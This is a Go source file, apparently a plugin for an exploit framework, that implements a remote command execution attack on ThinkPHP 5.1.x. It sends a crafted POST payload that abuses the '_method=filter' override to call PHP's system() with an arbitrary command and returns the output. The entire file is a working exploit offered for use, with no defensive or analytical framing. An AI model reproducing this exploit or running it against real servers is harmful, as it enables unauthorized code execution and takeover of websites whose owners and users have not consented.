package exp_ThinkPHP

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
)

type Exp_ThinkPHP5_1_2 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_ThinkPHP5_1_2) Attack_cmd1() (expResult exp_model.ExpResult) {
	// 构造payload
	headers := self.GetInitExpHeaders()

	data := fmt.Sprintf("c=system&f=%s&&_method=filter&", self.MustGetStringParam("cmd"))

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}

	expResult.Result = httpresp.Body
	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_ThinkPHP5_1_2{}, "exp_ThinkPHP5_1_2.yml")
}
